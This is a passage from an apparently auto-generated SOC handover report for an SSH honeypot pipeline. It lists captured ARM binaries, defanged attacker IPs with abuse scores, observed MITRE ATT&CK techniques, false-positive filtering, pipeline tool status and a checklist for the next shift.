| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `61.186.136[.]36` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 50 |
| `201.209.109[.]217` | VE | CANTV Servicios, Venezuela | **100** ⚠️ | 18 |
| `172.210.53[.]227` | US | Microsoft Limited | **100** ⚠️ | 0 |
| `46.30.161[.]197` | UA | Industrial Media Network LLC | **100** ⚠️ | 50 |
| `81.214.75[.]248` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 35 |
| `201.243.207[.]68` | VE | CANTV Servicios, Venezuela | **100** ⚠️ | 0 |
| `112.120.49[.]14` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 9 |
| `182.92.11[.]80` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `111.70.39[.]214` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 19 |
| `112.94.5[.]43` | CN | United-Communications-Network-Technology-Co-Ltd, GuangZhou | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 35 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 47 cases |
| Tool 34  | Credential Extractor        | ✅ 44 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (17.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 24 recon entry/entries in table (2 group(s) consolidating 7 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-01T09:02:19Z_
